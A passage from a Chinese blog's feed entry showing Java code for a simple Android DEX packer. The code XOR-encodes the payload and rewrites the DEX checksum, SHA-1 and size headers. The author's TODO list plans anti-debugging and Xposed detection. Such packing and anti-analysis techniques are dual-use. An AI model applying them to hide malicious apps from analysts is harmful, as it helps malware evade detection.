srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcdata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixCheckSumHeader</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span> </span>&#123;</span><br><span class="line">        Adler32 adler = <span class="keyword">new</span> Adler32();</span><br><span class="line">        adler.update(dexBytes, <span class="number">12</span>, dexBytes.length - <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">long</span> value = adler.getValue();</span><br><span class="line">        <span class="keyword">int</span> va = (<span class="keyword">int</span>) value;</span><br><span class="line">        <span class="keyword">byte</span>[] newcs = intToByte(va);</span><br><span class="line">        <span class="keyword">byte</span>[] recs = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            recs[i] = newcs[newcs.length - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(recs, <span class="number">0</span>, dexBytes, <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixSHA1Header</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"SHA-1"</span>);</span><br><span class="line">        md.update(dexBytes, <span class="number">32</span>, dexBytes.length - <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] newdt = md.digest();</span><br><span class="line">        System.arraycopy(newdt, <span class="number">0</span>, dexBytes, <span class="number">12</span>, <span class="number">20</span>);</span><br><span class="line">        String hexstr = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; newdt.length; i++) &#123;</span><br><span class="line">            hexstr += Integer.toString((newdt[i] &amp; <span class="number">0xff</span>) + <span class="number">0x100</span>, <span class="number">16</span>)</span><br><span class="line">                    .substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hexstr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fixFileSizeHeader</span><span class="params">(<span class="keyword">byte</span>[] dexBytes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] newfs = intToByte(dexBytes.length);</span><br><span class="line">        <span class="keyword">byte</span>[] refs = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            refs[i] = newfs[newfs.length - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.arraycopy(refs, <span class="number">0</span>, dexBytes, <span class="number">32</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] readFileBytes(File file) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        ByteArrayOutputStream localByteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fis.read(arrayOfByte);</span><br><span class="line">            <span class="keyword">if</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">                localByteArrayOutputStream.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fis.close();</span><br><span class="line">                <span class="keyword">return</span> localByteArrayOutputStream.toByteArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><p>综上，这就是一个垃圾壳子。</p><p>TODO:</p><ul><li>搞一个加密算法把内容加密一下</li><li>加载源apk的代码写到so里</li><li>加些反调试、检测Xposed的内容</li><li>后续可能还会升级成类抽取的…</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;nemo大佬来北京，聊天中问起我最近有没有写代码，我一想，好像是真没有，所以单纯是想来写个代码。&lt;/p&gt;
&lt;h3 id=&quot;简介&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="android" scheme="https://github.com/Cracke-S-J/tags/android/"/>
    
  </entry>
  
</feed>
